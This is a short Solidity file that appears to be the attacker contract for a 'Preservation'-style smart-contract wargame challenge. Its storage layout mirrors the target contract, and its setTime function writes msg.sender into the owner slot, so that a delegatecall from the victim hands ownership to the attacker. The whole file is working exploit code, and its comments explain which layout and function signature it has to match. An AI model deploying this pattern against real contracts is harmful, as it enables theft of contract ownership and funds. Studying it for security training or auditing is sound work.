// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract MaliciousLibrary {
    // The storage layout (types) here should exactly match with the Preservation
    address public random1;
    address public random2;
    address public owner;

    // NO need to have constructor, as it is used just to change owner
    function setTime(uint256 _time) public {  // signature should exactly match
        owner = msg.sender;
    }
}